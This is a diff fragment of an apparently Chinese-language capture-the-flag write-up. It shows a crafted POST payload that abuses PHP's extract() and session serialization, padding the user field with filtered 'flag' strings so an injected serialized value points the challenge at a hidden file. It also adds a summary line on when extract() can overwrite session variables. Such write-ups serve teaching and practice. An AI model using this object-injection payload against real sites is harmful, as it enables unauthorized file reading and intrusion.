@@ -115,3 +115,6 @@ POST
 _SESSION[user]=flagflagflagflagflagflag&_SESSION[function]=a";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";s:1:"a";s:1:"a";}&function=show_image
 ```
 
+## 小结
+
+1. extract对session进行变量覆盖的条件是`session_start`在`extract`之前，参考[bestphp's revenge](bestphps-revenge.md)。
